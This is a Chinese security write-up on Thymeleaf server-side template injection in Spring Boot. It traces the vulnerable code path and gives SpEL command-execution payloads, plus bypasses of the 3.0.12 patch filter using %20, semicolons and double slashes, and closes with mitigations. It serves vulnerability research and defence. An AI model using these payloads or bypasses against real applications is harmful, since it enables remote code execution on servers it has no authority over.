# Thymeleaf

## 0x01 基础语法

- `${...}`：变量表达式 —— 通常在实际应用，一般是OGNL表达式或者是 Spring EL，如果集成了Spring的话，可以在上下文变量（context variables ）中执行
- `*{...}`: 选择表达式 —— 类似于变量表达式，区别在于选择表达式是在当前选择的对象而不是整个上下文变量映射上执行。
- `#{...}`: Message (i18n) 表达式 —— 允许从外部源（比如`.properties`文件）检索特定于语言环境的消息
- `@{...}`: 链接 (URL) 表达式 —— 一般用在应用程序中设置正确的 URL/路径（URL重写）。
- `~{...}`：片段表达式 —— **Thymeleaf 3.x 版本新增的内容**，分段段表达式是一种表示标记片段并将其移动到模板周围的简单方法。 正是由于这些表达式，片段可以被复制，或者作为参数传递给其他模板等等

最后的一个表达式的出现正是导致这次SSTI的关键

```
~{templatename::selector}，会在/WEB-INF/templates/目录下寻找名为templatename的模版中定义的fragment
```

- `~{templatename}`引用templatename的整个模板
- `~{::selector}`引用来自同一个模板的`selector`的模板内容

## 0x02 SSTI

这次`SSTI`和之前SSTI不一样，之前的模板利用点都在模板内容本身，或者是因为操作者直接将内容拼接在template中，最后导致了SSTI，这次我们先来看看存在漏洞的代码

```java
@GetMapping("/admin") 
public String path(@RequestParam String language) 
{ 
    return "language/" + language + "/admin"; 
}
```

根据我们的常规认知，现在应该是springboot根据返回值用`Thymeleaf`模板引擎来寻找对应的文件并且解析。那么我们断点打在return这个位置，一步一步跟进去。

首先是`org.springframework.web.servlet.DispatcherServlet#doDispatch`中调用controller方法，返回了`modelView`

![image-20220612095651824](https://img.dem0dem0.top/images/image-20220612095651824.png)

然后调用`processDispatchResult`方法，调用`render`方法，然后通过`resolveViewName`或者到`Thymeleaf`引擎调用`render`

![image-20220612101151315](https://img.dem0dem0.top/images/image-20220612101151315.png)

`org.thymeleaf.spring5.view.ThymeleafView#renderFragment`对我们传入的视图名字进行了处理

![image-20220612101527716](https://img.dem0dem0.top/images/image-20220612101527716.png)

我们跟进这个方法`preprocess`精简一下代码，PREPROCESS_EVAL_PATTERN=="\_\_x\_\_"

```java
    static String preprocess(
            final IExpressionContext context,
            final String input) {
        final Matcher matcher = PREPROCESS_EVAL_PATTERN.matcher(input);
        if (matcher.find()) {          
                final Object result = expression.execute(context, StandardExpressionExecutionContext.RESTRICTED);
```

里面就是EL表达式解析了。这样第一个payload也就不难理解了

```java
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("whoami").getInputStream()).next()}__::.k
```

至于后面的`.k`是要符合语法。`~{...}`这个语法是3.x版本引入的，所以在2.x版本不会受影响。

## 0x03 Thymeleaf SSTI Bypass

官方发送的通告中，3.0.12版本进行了修复，通过github的diff发现

![image-20220612102856310](https://img.dem0dem0.top/images/image-20220612102856310.png)

```java
 private static final char[] NEW_ARRAY = "wen".toCharArray(); // Inverted "new"
    private static final int NEW_LEN = NEW_ARRAY.length;


    public static boolean containsSpELInstantiationOrStatic(final String expression) {

        /*
         * Checks whether the expression contains instantiation of objects ("new SomeClass") or makes use of
         * static methods ("T(SomeClass)") as both are forbidden in certain contexts in restricted mode.
         */
        final int explen = expression.length();
        int n = explen;
        int ni = 0; // index for computing position in the NEW_ARRAY
        int si = -1;
        char c;
        while (n-- != 0) {
            c = expression.charAt(n);
            // When checking for the "new" keyword, we need to identify that it is not a part of a larger
            // identifier, i.e. there is whitespace after it and no character that might be a part of an
            // identifier before it.
            if (ni < NEW_LEN
                    && c == NEW_ARRAY[ni]
                    && (ni > 0 || ((n + 1 < explen) && Character.isWhitespace(expression.charAt(n + 1))))) {
                ni++;
                if (ni == NEW_LEN && (n == 0 || !Character.isJavaIdentifierPart(expression.charAt(n - 1)))) {
                    return true; // we found an object instantiation
                }
                continue;
            }
            if (ni > 0) {
                // We 'restart' the matching counter just in case we had a partial match
                n += ni;
                ni = 0;
                if (si < n) {
                    // This has to be restarted too
                    si = -1;
                }
                continue;
            }
            ni = 0;
            if (c == ')') {
                si = n;
            } else if (si > n && c == '('
                        && ((n - 1 >= 0) && (expression.charAt(n - 1) == 'T'))
                        && ((n - 1 == 0) || !Character.isJavaIdentifierPart(expression.charAt(n - 2)))) {
                return true;
            } else if (si > n && !(Character.isJavaIdentifierPart(c) || c == '.')) {
                si = -1;
            }
        }
        return false;

    }
```

因此这个过滤，我们不难

1、表达式中不能含有关键字`new`
2、在`(`的左边的字符不能是`T`
3、不能在`T`和`(`中间添加的字符使得原表达式出现问题

所以`Character.isJavaIdentifierPart`变成了一个突破口,%20,\n等等都可以绕过。

```
__${T%20(java.lang.Runtime).getRuntime().exec("calc")}__::.x
;/__${T%20(java.lang.runtime).getruntime().exec("calc")}__::.x
/__${T%20(java.lang.runtime).getruntime().exec("calc")}__::.x
```

在利用的时候，又又又发现了问题。

```java
 @GetMapping("/home/{page}")
    public String getHome(@PathVariable String page) {
        log.info("Pages: " + page);
        return "home/" + page;
    }
```

如果返回的视图名字和path相同的话，(3.0.12版本)上面的payload是不会被触发的。因为还增加了一个函数`SpringRequestUtils`.

bypass的话

- springboot的矩阵向量(如果发现路径中存在分号，那么会调用`removeSemicolonContent`方法来移除分号)

  ```
  home;/__${t(java.lang.runtime).getruntime().exec("open-acalculator")}__::.x
  ```

- "//"在路径处理时

  ```
  home//__${t(java.lang.runtime).getruntime().exec("open-acalculator")}__::.x
  ```

## 0x04 无return如何SSTI

根据spring boot定义，如果controller无返回值，则以GetMapping的路由为视图名称。当然，对于每个http请求来讲，其实就是将请求的url作为视图名称，调用模板引擎去解析。https://docs.spring.io/spring/docs/current/spring-framework-reference/web.html#mvc-ann-return-types

```
@GetMapping("/doc/{document}")
public void getDocument(@PathVariable String document) {
    log.info("Retrieving " + document);
}
```

```
GET /doc/__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x
```

至于如何bypass不用多说了吧。

## 0x05:key:如果模板内容可控能否bypass?

这种低版本，直接嗦了~~

```html
<!DOCTYPE html>
<html lang="en" xmlns="http://www.w3.org/1999/xhtml"
      xmlns:th="http://www.thymeleaf.org">
<head>
    <title>Hello World!</title>
</head>
<body>
<h1 th:inline="text">Hello</h1>
<p th:text="@{__${exp}__}"></p>
</body>
</html>
```



## 0x05修复方案

### 1. 设置ResponseBody注解

如果设置`ResponseBody`，则不再调用模板解析

### 2. 设置redirect重定向

```
@GetMapping("/safe/redirect")
public String redirect(@RequestParam String url) {
    return "redirect:" + url; //CWE-601, as we can control the hostname in redirect
```

根据spring boot定义，如果名称以`redirect:`开头，则不再调用`ThymeleafView`解析，调用`RedirectView`去解析`controller`的返回值

### 3. response

```
@GetMapping("/safe/doc/{document}")
public void getDocument(@PathVariable String document, HttpServletResponse response) {
    log.info("Retrieving " + document); //FP
}
```

由于controller的参数被设置为HttpServletResponse，Spring认为它已经处理了HTTP Response，因此不会发生视图名称解析

## 参考

> 1. panda: https://blog.cnpanda.net/sec/1063.html
>
> 2. 宽字节师傅: https://paper.seebug.org/1332/3
>
> 3. 拓展:https://www.cnblogs.com/CoLo/p/15507738.html
>
> 4. 更多形势的payload:https://xz.aliyun.com/t/9826#toc-4
>
>    `${} / *{} / ${{}}`还有`__`还有`.x`和`::`
